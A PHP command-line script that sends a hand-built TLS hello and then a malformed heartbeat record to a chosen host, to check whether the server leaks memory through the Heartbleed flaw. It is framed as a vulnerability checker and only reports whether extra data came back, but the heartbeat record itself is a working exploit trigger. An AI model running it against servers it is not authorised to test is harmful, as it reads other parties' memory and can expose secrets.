<?php

class usageException extends Exception { }


$hello = hex2bin('16030200dc010000d8030253435b909d9b720bbc0cbc2b92a84897cfbd3904cc160a8503909f770433d4de000066c014c00ac022c0210039003800880087c00fc00500350084c012c008c01cc01b00160013c00dc003000ac013c009c01fc01e00330032009a009900450044c00ec004002f00960041c011c007c00cc002000500040015001200090014001100080006000300ff01000049000b000403000102000a00340032000e000d0019000b000c00180009000a00160017000800060007001400150004000500120013000100020003000f0010001100230000000f000101');

$heartbeat = hex2bin('1803020003014000');


try {
    if ($argc !== 3) {
        throw new usageException('Connecting failed.');
    }

    $targetHost = $argv[1];
    $targetPort = $argv[2];

    $socket = socket_create(AF_INET, SOCK_STREAM, getprotobyname('tcp'));
    socket_set_option($socket, SOL_SOCKET, SO_RCVTIMEO, array("sec"=>10, "usec"=>0));

    echo "* Connecting to {$targetHost}:{$targetPort}\n";
    if (!socket_connect($socket, $targetHost, $targetPort)) {
        throw new Exception('Connecting failed.');
    }

    echo "* Sending 'Hello' to host\n";
    $ret = socket_write($socket, $hello);
    if ($ret === false) {
        throw new Exception('Sending Hello failed.');
    }

    echo "* Waiting response for 'Hello'\n";
    while (true) {
        $resHeader = recvmsg($socket);

        if (is_null($resHeader)) {
            throw new Exception('Server closed connection without sending Server Hello.');
        }

        if ($resHeader['type'] && ord(substr($resHeader['payload'], 0, 1)) == 14) {
            break;
        }
    }

    echo "* Sending heartbeat request\n";
    $ret = socket_write($socket, $heartbeat);
    if ($ret === false) {
        throw new Exception('Sending heartbeat failed.');
    }
    is_hb_vulnerable($socket);

    socket_close($socket);

} catch (usageException $e) {
    echo "usage: php_cli_bin_path " . __FILE__ . " 'target host' 'target port'\n";
} catch (Exception $e) {
    echo $e->getMessage() . "\n";
    socket_close($socket);
}


function recvmsg($socket)
{
    $rawResHeader = socket_read($socket, 5);
    if (empty($rawResHeader)) {
        echo "Unexpected EOF receiving record header - server closed connection\n";
        return null;
    }
    $resHeader = unpack('Ctype/nversion/nlength', $rawResHeader);

    $payload = socket_read($socket, $resHeader['length']);
    if (empty($payload)) {
        echo "Unexpected EOF receiving record payload - server closed connection\n";
        return null;
    }
    $resHeader['payload'] = $payload;

    printf("Received message: type = %d, version = %04x, length = %d\n",
        $resHeader['type'],
        $resHeader['version'],
        strlen($payload)
    );

    return $resHeader;
}

function is_hb_vulnerable($socket)
{
    $resHeader = recvmsg($socket);

    if (is_null($resHeader)) {
        echo "No heartbeat response received, server likely not vulnerable\n";
        return false;
    }

    if ($resHeader['type'] == 24) {
        echo "Received heartbeat response\n";
        if (strlen($resHeader['payload']) > 3) {
            echo "WARNING: server returned more data than it should - server is vulnerable!\n";
        } else {
            echo "Server processed malformed heartbeat, but did not return any extra data.";
        }
        return true;
    }

    if ($resHeader['type'] == 21) {
        echo "Rceived alert\n";
        echo "Server returned error, likely not vulnerable\n";
        return false;
    }
}
